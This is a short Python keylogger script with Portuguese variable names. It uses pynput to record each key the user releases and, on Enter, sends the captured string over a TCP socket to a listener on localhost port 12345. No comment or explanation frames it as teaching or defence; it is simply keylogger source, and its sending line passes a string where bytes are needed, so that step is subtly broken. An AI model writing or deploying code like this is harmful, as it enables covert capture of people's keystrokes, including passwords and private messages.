import socket
from pynput.keyboard import Listener , Key
from sys import exit

clt = socket.socket(socket.AF_INET , socket.SOCK_STREAM)

clt.connect(("localhost" , 12345))

palavra = ""

def pressionada(tecla):
    pass

def solta(tecla):
    
    carac = str(tecla).encode("utf-8")
    global palavra
    palavra += str(tecla)
   
    if tecla == Key.enter:
        clt.sendall(palavra)
        palavra = ""
        return False


with Listener(on_press=pressionada , on_release=solta) as klg:
    
    klg.join()
    
